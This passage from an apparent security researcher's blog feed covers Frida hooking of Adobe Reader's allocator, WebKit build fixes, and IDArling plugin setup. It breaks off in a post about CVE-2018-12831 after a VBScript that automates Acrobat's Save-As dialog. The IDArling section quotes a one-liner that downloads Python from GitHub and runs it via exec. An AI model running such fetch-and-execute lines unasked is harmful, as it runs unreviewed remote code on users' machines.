<p>最近的工作中，我做了很多逆向的工作，虽然有部分工作暂时看不到什么收益，算是白折腾浪费了两周，但是这段时间熟悉了<code>pykd</code>，<code>windbg script</code>，<code>frida</code>，<code>IDA Python</code>的编写…也搞了一些方便日后修改使用的模板，算是有一点点收获吧，不过浪费了时间还是很难过。</p>
<h4 id="0x01-HOOK需求"><a href="#0x01-HOOK需求" class="headerlink" title="0x01 : HOOK需求"></a>0x01 : HOOK需求</h4><p>我需要去追一些内存分配、有些可能还需要操作一下，方便我的逆向工作顺利进行。</p>
<p>我这里以<code>Adobe Reader</code>  为例子，我hook了<code>reader</code>自己封装的内存分配函数，并且显示分配得到的内存；其他的需求都差不多，直接改模板就行，我是用的官方的模板修改的。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">on_message</span><span class="params">(message, data)</span>:</span></span><br><span class="line">    print(<span class="string">"[%s] =&gt; %s"</span> % (message, data))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(target_process)</span>:</span></span><br><span class="line">    session = frida.attach(target_process)</span><br><span class="line"></span><br><span class="line">    script = session.create_script(<span class="string">"""</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    var baseAddr = Module.findBaseAddress('AcroRd32.dll');</span></span><br><span class="line"><span class="string">    console.log('AcroRd32.dll baseAddr: ' + baseAddr);</span></span><br><span class="line"><span class="string">	var CallocFunc = resolveAddress(baseAddr);</span></span><br><span class="line"><span class="string">	var JP2KDecodeFilterObj;</span></span><br><span class="line"><span class="string">	var size = 1;</span></span><br><span class="line"><span class="string">	Interceptor.attach(CallocFunc, &#123; </span></span><br><span class="line"><span class="string">	    </span></span><br><span class="line"><span class="string">		onEnter: function (args) &#123;</span></span><br><span class="line"><span class="string">			//console.log('[+] Called CallocFunc' + CallocFunc);</span></span><br><span class="line"><span class="string">			size = args[0];</span></span><br><span class="line"><span class="string">			//console.log('[+] ALLOC size : ' + size);</span></span><br><span class="line"><span class="string">		&#125;,</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">		onLeave: function (retval) &#123;</span></span><br><span class="line"><span class="string">			console.log('[+] Returned from CallocFunc: ' + retval);</span></span><br><span class="line"><span class="string">			dumpAddr('ret buffer', retval, parseInt(size));</span></span><br><span class="line"><span class="string">		&#125;</span></span><br><span class="line"><span class="string">    &#125;);</span></span><br><span class="line"><span class="string">	</span></span><br><span class="line"><span class="string">	function replaceMem(addr, size)&#123;</span></span><br><span class="line"><span class="string">	    if (addr.isNull())</span></span><br><span class="line"><span class="string">			return;</span></span><br><span class="line"><span class="string">	    for(var idx = 0; idx &lt; size; idx++)&#123;</span></span><br><span class="line"><span class="string">		    Memory.writeU8(addr.add(ptr(idx)), 0x41);</span></span><br><span class="line"><span class="string">		&#125;</span></span><br><span class="line"><span class="string">	&#125;</span></span><br><span class="line"><span class="string">	</span></span><br><span class="line"><span class="string">	function dumpAddr(info, addr, size) &#123;</span></span><br><span class="line"><span class="string">        if (addr.isNull())</span></span><br><span class="line"><span class="string">            return;</span></span><br><span class="line"><span class="string">        console.log('Data dump ' + info + ' :');</span></span><br><span class="line"><span class="string">        var buf = Memory.readByteArray(addr, size);</span></span><br><span class="line"><span class="string">        console.log(hexdump(buf, &#123; offset: 0, length: size, header: true, ansi: true &#125;));</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">	</span></span><br><span class="line"><span class="string">	function resolveAddress(addr) &#123;</span></span><br><span class="line"><span class="string">        var offset = ptr(offset_you_get)</span></span><br><span class="line"><span class="string">        var result = baseAddr.add(offset);</span></span><br><span class="line"><span class="string">        console.log('[+] CallocFunc addr=' + result);</span></span><br><span class="line"><span class="string">        return result;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">	</span></span><br><span class="line"><span class="string">"""</span>)</span><br><span class="line">    script.on(<span class="string">'message'</span>, on_message)</span><br><span class="line">    script.load()</span><br><span class="line">    print(<span class="string">"[!] Ctrl+D on UNIX, Ctrl+Z on Windows/cmd.exe to detach from instrumented program.\n\n"</span>)</span><br><span class="line">    sys.stdin.read()</span><br><span class="line">    session.detach()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) != <span class="number">2</span>:</span><br><span class="line">        print(<span class="string">"Usage: %s &lt;process name or PID&gt;"</span> % __file__)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        target_process = int(sys.argv[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        target_process = sys.argv[<span class="number">1</span>]</span><br><span class="line">    main(target_process)</span><br></pre></td></tr></table></figure>
<p>代码还是比较简单的，py脚本，hook部分的代码是js写的，（又被逼着学了一下js，然而我觉得我的js写的有种c的味道…）</p>
<p>如果你仔细看被hook的进程的话，你会发现在hook发生地时候，<code>Frida</code>的dll会注入进去，然后就是传统的那种hook的方式了，只是框架帮你做了太多的事情，所以你只需要写好js就好了。</p>
<p>我截取部分运行时候输出：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">00000000  00 00 00 00 00 00                                ......</span><br><span class="line">[+] Returned from CallocFunc: 0x348f6fb0</span><br><span class="line">Data dump ret buffer :</span><br><span class="line">           0  1  2  3  4  5  6  7  8  9  A  B  C  D  E  F  0123456789ABCDEF</span><br><span class="line">00000000  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">00000010  00 00 00                                         ...</span><br><span class="line">[+] Returned from CallocFunc: 0x32d20fd8</span><br><span class="line">Data dump ret buffer :</span><br><span class="line">           0  1  2  3  4  5  6  7  8  9  A  B  C  D  E  F  0123456789ABCDEF</span><br><span class="line">00000000  00 00 00 00 00 00 00 00 00                       .........</span><br><span class="line">[+] Returned from CallocFunc: 0x2c3f0f90</span><br><span class="line">Data dump ret buffer :</span><br><span class="line">           0  1  2  3  4  5  6  7  8  9  A  B  C  D  E  F  0123456789ABCDEF</span><br><span class="line">00000000  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">00000010  00 00 00 00 00 00 00 00 00 00 00 00              ............</span><br><span class="line">[+] Returned from CallocFunc: 0x1b934<span class="built_in">fc</span>8</span><br><span class="line">Data dump ret buffer :</span><br><span class="line">           0  1  2  3  4  5  6  7  8  9  A  B  C  D  E  F  0123456789ABCDEF</span><br><span class="line">00000000  00 00 00 00 00 00 00 00 00 00 00 00 00           .............</span><br><span class="line">[+] Returned from CallocFunc: 0x1bd8efb0</span><br><span class="line">Data dump ret buffer :</span><br><span class="line">           0  1  2  3  4  5  6  7  8  9  A  B  C  D  E  F  0123456789ABCDEF</span><br><span class="line">00000000  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">00000010  00 00 00                                         ...</span><br><span class="line">[+] Returned from CallocFunc: 0x35857f58</span><br><span class="line">Data dump ret buffer :</span><br><span class="line">           0  1  2  3  4  5  6  7  8  9  A  B  C  D  E  F  0123456789ABCDEF</span><br><span class="line">00000000  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">00000010  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">00000020  00 00 00 00 00 00 00 00 00 00                    ..........</span><br><span class="line">[+] Returned from CallocFunc: 0x35b33<span class="built_in">fc</span>8</span><br><span class="line">Data dump ret buffer :</span><br><span class="line">           0  1  2  3  4  5  6  7  8  9  A  B  C  D  E  F  0123456789ABCDEF</span><br><span class="line">00000000  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">00000010  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">00000020  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">00000030  00                                               .</span><br><span class="line">[+] Returned from CallocFunc: 0x1bd66f78</span><br><span class="line">Data dump ret buffer :</span><br><span class="line">           0  1  2  3  4  5  6  7  8  9  A  B  C  D  E  F  0123456789ABCDEF</span><br><span class="line">00000000  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">00000010  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">00000020  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">00000030  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">00000040  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">00000050  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">00000060  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">00000070  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">00000080  00 00 00 00 00 00 00 00                          ........</span><br><span class="line">[+] Returned from CallocFunc: 0x1bd6eff8</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>一些其他的想法，这个其实可以做简单的in memory fuzz了，循环call，然后换内存…当然这个想法很low了，n年前的东西了，而且这种的话cov很难处理。</p>
<p>要说问题，就是<code>Frida</code>读取本地文件的问题，我试了<code>new File</code>和<code>frida-fs</code>均以失败告终…如果有人知道怎么玩的话，还望不吝赐教  :)</p>
<h4 id="0x02-其他"><a href="#0x02-其他" class="headerlink" title="0x02 : 其他"></a>0x02 : 其他</h4><p>在写这些东西的时候，请教了<a href="https://github.com/jmpews" target="_blank" rel="noopener"><code>jmpews</code>师傅</a>很多问题，十分感谢！</p>
<p>jmpews师傅后面向我推荐了<code>detours + Xenos</code>这种方式来做hook，精力有限，而且上手难度有点高，所以暂时只能放在to do list上了，不过还是很感谢～</p>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;0x00-关于使用Frida&quot;&gt;&lt;a href=&quot;#0x00-关于使用Frida&quot; class=&quot;headerlink&quot; title=&quot;0x00 : 关于使用Frida&quot;&gt;&lt;/a&gt;0x00 : 关于使用Frida&lt;/h4&gt;&lt;p&gt;&lt;code&gt;Frida&lt;/code&gt;是一个跨平台的、多平台的hook框架，使用起来十分方便，而且文档全面，可以很好的辅助逆向工程。在需要使用一些hook的时候，可以很快地完成；如果还是用c/c++的话..写dll，还要想办法dll注入，而且很麻烦不灵活，修改代码很麻烦。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Tools" scheme="http://o0xmuhe.me/tags/Tools/"/>
    
      <category term="Frida" scheme="http://o0xmuhe.me/tags/Frida/"/>
    
  </entry>
  
  <entry>
    <title>Webkit编译踩坑记录</title>
    <link href="http://o0xmuhe.me/2018/12/31/Webkit%E7%BC%96%E8%AF%91%E8%B8%A9%E5%9D%91%E8%AE%B0%E5%BD%95/"/>
    <id>http://o0xmuhe.me/2018/12/31/Webkit编译踩坑记录/</id>
    <published>2018-12-31T15:56:43.000Z</published>
    <updated>2018-12-31T16:29:34.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="0x00-环境及工具"><a href="#0x00-环境及工具" class="headerlink" title="0x00 : 环境及工具"></a>0x00 : 环境及工具</h4><p>MacOS MoJave 10.14.2</p>
<p>Xcode 10.1</p>
<a id="more"></a>
<h4 id="0x01-编译过程"><a href="#0x01-编译过程" class="headerlink" title="0x01 : 编译过程"></a>0x01 : 编译过程</h4><ol>
<li>下载源码 </li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/WebKit/webkit</span><br></pre></td></tr></table></figure>
<p>官网那个太不稳定了，一直挂着代理还容易断，github这个镜像更稳定。</p>
<ol>
<li>编译</li>
</ol>
<p>使用Xcode打开项目，依次打开 <code>File--&gt;Workspace Settings--&gt;</code>，选择<code>Advanced</code>，然后选择<code>Custom</code>，并且在<code>Products</code>和<code>Intermediates</code>中填写<code>WebkitBuild</code>，设置完毕。</p>
<p>其他设置默认就可以了，然后Xcode的菜单栏<code>Procduct--&gt;Build</code>，慢慢等它编译吧，大概不到10分钟的样子就可以编译好。</p>
<p>最后得到:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ ls</span><br><span class="line">ANGLE.build             JavaScriptCore.build    PAL.build               TestWebKitAPI.build     WebInspectorUI.build    WebKitTestRunner.build  libwebrtc.build</span><br><span class="line">Debug                   MiniBrowser.build       PrecompiledHeaders      WTF.build               WebKit.build            bmalloc.build</span><br><span class="line">DumpRenderTree.build    MobileMiniBrowser.build Release                 WebCore.build           WebKitLegacy.build      gtest.build</span><br></pre></td></tr></table></figure>
<h4 id="0x02-踩坑-dyld-Symbol-not-found"><a href="#0x02-踩坑-dyld-Symbol-not-found" class="headerlink" title="0x02 : 踩坑(dyld: Symbol not found)"></a>0x02 : 踩坑(dyld: Symbol not found)</h4><p>在运行编译完的binary的时候，我遇到了报错信息:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ ./Debug/jsc</span><br><span class="line">dyld: Symbol not found: __ZN3JSC10DisallowGC19s_scopeReentryCountE</span><br><span class="line">  Referenced from: /Users/muhe/Code/webkit/WebKitBuild/./Debug/jsc</span><br><span class="line">  Expected <span class="keyword">in</span>: /System/Library/Frameworks/JavaScriptCore.framework/Versions/A/JavaScriptCore</span><br><span class="line"> <span class="keyword">in</span> /Users/muhe/Code/webkit/WebKitBuild/./Debug/jsc</span><br><span class="line">[1]    64039 abort      ./Debug/jsc</span><br></pre></td></tr></table></figure>
<p>搜了很多都无果(可能关键词问题)，问了0x9k师傅之后得到了解决方案，原来官网就有解答 囧</p>
<p>解决方法是：设置<code>DYLD_FRAMEWORK_PATH</code>环境变量。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> DYLD_FRAMEWORK_PATH=/Users/muhe/Code/webkit/WebKitBuild/Debug</span><br></pre></td></tr></table></figure>
<p>之后就可以正常运行了:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ ./Debug/jsc</span><br><span class="line">&gt;&gt;&gt; var <span class="built_in">test</span> = <span class="string">"Hello jsc"</span>;</span><br><span class="line">undefined</span><br><span class="line">&gt;&gt;&gt; <span class="built_in">test</span></span><br><span class="line">Hello jsc</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;0x00-环境及工具&quot;&gt;&lt;a href=&quot;#0x00-环境及工具&quot; class=&quot;headerlink&quot; title=&quot;0x00 : 环境及工具&quot;&gt;&lt;/a&gt;0x00 : 环境及工具&lt;/h4&gt;&lt;p&gt;MacOS MoJave 10.14.2&lt;/p&gt;
&lt;p&gt;Xcode 10.1&lt;/p&gt;
    
    </summary>
    
    
      <category term="Webkit" scheme="http://o0xmuhe.me/tags/Webkit/"/>
    
  </entry>
  
  <entry>
    <title>逆向协作之IDA插件IDArling</title>
    <link href="http://o0xmuhe.me/2018/12/25/%E9%80%86%E5%90%91%E5%8D%8F%E4%BD%9C%E4%B9%8BIDA%E6%8F%92%E4%BB%B6IDArling/"/>
    <id>http://o0xmuhe.me/2018/12/25/逆向协作之IDA插件IDArling/</id>
    <published>2018-12-25T10:41:07.000Z</published>
    <updated>2018-12-25T11:48:58.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="0x00-介绍"><a href="#0x00-介绍" class="headerlink" title="0x00 : 介绍"></a>0x00 : 介绍</h4><p><code>IDArling</code>是一个逆向协作插件，将IDA使用过程中产生的数据文件放在服务器上，并且可以自动同步，适合多人协作使用，比如CTF比赛、工作中的项目；也适合个人使用，比如在公司的工作内容同步到自己的服务器上，回家之后用家里的电脑方便查看和使用。</p>
<a id="more"></a>
<p>我就属于后者…有时候懒得背电脑回家，有时候逆向的时候很不方便，<code>idb</code>之间同步就是问题…而且目标更新之后，多个版本的逆向对比，不方便，直接部署到服务器上还是很方便的。</p>
<h4 id="0x01-安装以及部署"><a href="#0x01-安装以及部署" class="headerlink" title="0x01 : 安装以及部署"></a>0x01 : 安装以及部署</h4><h5 id="1-具体的安装步骤"><a href="#1-具体的安装步骤" class="headerlink" title="1. 具体的安装步骤"></a>1. 具体的安装步骤</h5><p>以下来自官方github上项目的readme文档：</p>
<ul>
<li>​    Copy <code>idarling_plugin.py</code> and the <code>idarling</code> folder to the IDA plugins folder.</li>
<li>Alternatively, you can use the “easy install” method by copying the following</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib2; exec(urllib2.urlopen(<span class="string">'https://raw.githubusercontent.com/IDArlingTeam/IDArling/master/easy_install.py'</span>)).read()</span><br></pre></td></tr></table></figure>
<p>这行py在IDA自带的那个py shell里执行就好了。</p>
<p>安装之后IDA的右下角会出现 <code>IDArling v0.0.1 | .....</code>的字样，说明安装成功。</p>
<h5 id="2-部署"><a href="#2-部署" class="headerlink" title="2. 部署"></a>2. 部署</h5><p>只需要安装pyqt5就好了，我这里用的ubuntu。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install python-pyqt5</span><br></pre></td></tr></table></figure>
<p>然后直接运行server脚本就可以启动服务。</p>
<h5 id="3-使用"><a href="#3-使用" class="headerlink" title="3. 使用"></a>3. 使用</h5><p>IDA右下角插件图标的地方，右键，添加服务器信息，然后选择服务器连接，就可以使用了。</p>
<h4 id="0x02-引用"><a href="#0x02-引用" class="headerlink" title="0x02 : 引用"></a>0x02 : 引用</h4><p><a href="https://github.com/IDArlingTeam/IDArling/blob/master/README.md" target="_blank" rel="noopener">IDArling</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;0x00-介绍&quot;&gt;&lt;a href=&quot;#0x00-介绍&quot; class=&quot;headerlink&quot; title=&quot;0x00 : 介绍&quot;&gt;&lt;/a&gt;0x00 : 介绍&lt;/h4&gt;&lt;p&gt;&lt;code&gt;IDArling&lt;/code&gt;是一个逆向协作插件，将IDA使用过程中产生的数据文件放在服务器上，并且可以自动同步，适合多人协作使用，比如CTF比赛、工作中的项目；也适合个人使用，比如在公司的工作内容同步到自己的服务器上，回家之后用家里的电脑方便查看和使用。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Tools" scheme="http://o0xmuhe.me/tags/Tools/"/>
    
      <category term="IDA" scheme="http://o0xmuhe.me/tags/IDA/"/>
    
  </entry>
  
  <entry>
    <title>由CVE-2018-12831引发的一些思考</title>
    <link href="http://o0xmuhe.me/2018/12/13/%E7%94%B1CVE-2018-12831%E5%BC%95%E5%8F%91%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%9D%E8%80%83/"/>
    <id>http://o0xmuhe.me/2018/12/13/由CVE-2018-12831引发的一些思考/</id>
    <published>2018-12-13T04:23:09.000Z</published>
    <updated>2018-12-20T06:06:40.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 : 前言"></a>0x00 : 前言</h4><p>这是一个很奇怪的case，在我还在学校的时候对Adobe Reader日常逆向的时候意外发现的一个UAF漏洞，很不幸的是无法利用；但是有趣的是他的触发方式，在后面的工作中，我在Foxit中意外发现了类似的问题，就在昨天，Adobe更新最新补丁之后，也发现了一个类似的UAF(0day,已提交给厂商)，这个0day不在本文讨论范围之内。</p>
<a id="more"></a>
<h4 id="0x01-漏洞情况"><a href="#0x01-漏洞情况" class="headerlink" title="0x01 : 漏洞情况"></a>0x01 : 漏洞情况</h4><h5 id="漏洞的基本信息如下"><a href="#漏洞的基本信息如下" class="headerlink" title="漏洞的基本信息如下:"></a>漏洞的<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-12831" target="_blank" rel="noopener">基本信息</a>如下:</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Adobe Acrobat and Reader versions 2018.011.20063 and earlier, 2017.011.30102 and earlier, and 2015.006.30452 and earlier have an use after free vulnerability. Successful exploitation could lead to arbitrary code execution.</span><br></pre></td></tr></table></figure>
<p>是一个很鸡肋的UseAfterFree的鸡肋漏洞，我个人认为无法利用 :(</p>
<p>这个漏洞发现的很意外，算是无心插柳，我们都知道可以使用<code>vbs</code>脚本调用一些windows的api，然后去完成一些窗口操作，下面来看一下这段vbs脚本：</p>
<figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">REM</span>: Save a Pdf as JPEG.</span><br><span class="line"> <span class="keyword">REM</span>:Also Multipage PDF will can be changed. <span class="keyword">Then</span> every page will be saved as single JPEG</span><br><span class="line"> <span class="keyword">REM</span>: The Filename you can change <span class="keyword">to</span> your needs.</span><br><span class="line"> <span class="keyword">REM</span>: <span class="keyword">If</span> you use Drag&amp;drop <span class="keyword">or</span> Filename as command</span><br><span class="line"> <span class="keyword">REM</span>: line argument the script will work <span class="keyword">with</span> this file.</span><br><span class="line"></span><br><span class="line"><span class="comment">'*********Settings in File**************************</span></span><br><span class="line">FileNM = <span class="string">"C:\Users\muhe\Desktop\x.pdf"</span> <span class="comment">'//Filename for File to transfer if NO argument is given</span></span><br><span class="line"><span class="comment">'****************************************************</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">set</span> WshShell = <span class="built_in">CreateObject</span> (<span class="string">"Wscript.Shell"</span>)</span><br><span class="line"><span class="keyword">set</span> fs = <span class="built_in">CreateObject</span>(<span class="string">"Scripting.FileSystemObject"</span>)</span><br><span class="line"><span class="keyword">Set</span> objArgs = WScript.Arguments</span><br><span class="line"><span class="keyword">if</span> objArgs.Count = <span class="number">1</span> <span class="keyword">then</span> FileNM = ObjArgs(<span class="number">0</span>)</span><br><span class="line">Info = <span class="string">"Save as JPEG"</span>&amp;VbCr&amp;_</span><br><span class="line">       <span class="string">"File Name: "</span>&amp;FileNM &amp;vbCr&amp;<span class="string">" Delete existing JPEG FILES with the same Name before!"</span>&amp;vbcr&amp;<span class="string">" Start now?"</span></span><br><span class="line">OK = <span class="built_in">MsgBox</span>(Info, vbQuestion+vbYesNo,<span class="string">"Insert Files"</span>) : <span class="keyword">if</span> OK = vbNo <span class="keyword">then</span> WScript.quit</span><br><span class="line"></span><br><span class="line"><span class="comment">'//Start or switch to Acrobat</span></span><br><span class="line">WshShell.run <span class="string">"Acrobat.exe"</span></span><br><span class="line"><span class="keyword">While</span> <span class="keyword">not</span> WshShell.AppActivate(<span class="string">"Adobe Acrobat"</span>) : Wscript.Sleep <span class="number">1000</span> : <span class="keyword">Wend</span></span><br><span class="line"><span class="keyword">Set</span> gApp = <span class="built_in">CreateObject</span>(<span class="string">"AcroExch.App"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> fs.FileExists(FILENM) <span class="keyword">then</span></span><br><span class="line">     <span class="built_in">MsgBox</span> <span class="string">"Ups! "</span> &amp; FileNM &amp; <span class="string">" doesn't exist? "</span> &amp; <span class="string">"Try new!"</span>, vbExclamation</span><br><span class="line">     WScript.quit</span><br><span class="line"><span class="keyword">end</span> <span class="keyword">if</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Set</span> BASFL = <span class="built_in">CreateObject</span>(<span class="string">"AcroExch.pdDoc"</span>)</span><br><span class="line">OK = BASFL.Open(FileNM) <span class="comment">'//Open the PDF-File</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> OK <span class="keyword">Then</span> <span class="keyword">if</span> <span class="built_in">MsgBox</span>(<span class="string">"Error open Basic File"</span>) <span class="keyword">then</span> Wscript.quit</span><br><span class="line">BASFL.OpenAVDoc(<span class="built_in">mid</span>(FileNM,<span class="built_in">InstrRev</span>(FileNM,<span class="string">"\")+1)) '// get the PDF-File into view</span></span><br><span class="line"><span class="string">WScript.Sleep 1000</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'// to get this part working reliable(!) use WinAPI, WMI, or AutoITX.dll to check the forground window</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">WshShell.SendKeys "</span>^+s<span class="string">" '// send keys for SaveAs</span></span><br><span class="line"><span class="string">WScript.Sleep 1000</span></span><br><span class="line"><span class="string">WshShell.SendKeys "</span>&#123;tab&#125;<span class="string">" '// goto Filetype</span></span><br><span class="line"><span class="string">WScript.Sleep 500</span></span><br><span class="line"><span class="string">WshShell.SendKeys "</span>J<span class="string">" '// switch filetype zu JPEG</span></span><br><span class="line"><span class="string">WScript.Sleep 500</span></span><br><span class="line"><span class="string">WshShell.SendKeys "</span>&#123;tab&#125;&#123;Enter&#125;<span class="string">" '// switsch to "</span>Save<span class="string">" and save</span></span><br><span class="line"><span class="string">WScript.Sleep 1000</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Set BASFL = nothing : set gApp = nothing</span></span><br></pre></td></tr></table></figure>
